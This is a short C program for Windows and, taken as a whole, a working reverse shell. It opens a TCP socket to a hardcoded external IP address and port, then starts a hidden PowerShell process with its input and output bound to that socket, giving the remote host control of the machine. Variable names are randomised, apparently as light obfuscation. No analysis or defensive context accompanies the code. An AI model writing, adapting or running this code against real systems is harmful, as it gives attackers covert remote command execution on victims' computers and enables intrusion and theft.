#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
#define RyzU1 "60.178.151.128"  
#define SCQCd 19482          
int main() {
    WSADATA qICxG;
    SOCKET Do14a;
    struct sockaddr_in RkL9r;
    STARTUPINFO cDJjc;
    PROCESS_INFORMATION Ckib4;
	WSAStartup(MAKEWORD(2, 2), &qICxG);
    Do14a = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	(RkL9r.sin_family = AF_INET, RkL9r.sin_addr.s_addr = inet_addr(RyzU1), RkL9r.sin_port = htons(SCQCd));
	connect(Do14a, (struct sockaddr*)&RkL9r, sizeof(RkL9r));
    ZeroMemory(&cDJjc, sizeof(cDJjc));
    cDJjc.cb = sizeof(cDJjc);
    cDJjc.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    cDJjc.hStdInput=cDJjc.hStdOutput = cDJjc.hStdError = (HANDLE)Do14a;
	cDJjc.wShowWindow=SW_HIDE;
	char i0iMh[]="powershell.exe -nologo";
    CreateProcessA(
        NULL,
        i0iMh,   
        NULL,
        NULL,
        TRUE,        
        0,
        NULL,
        NULL,
        &cDJjc,
        &Ckib4
    );
    WaitForSingleObject(Ckib4.hProcess, INFINITE);
	CloseHandle(Ckib4.hProcess);
    CloseHandle(Ckib4.hThread);
    closesocket(Do14a);
    WSACleanup();
    return 0;
}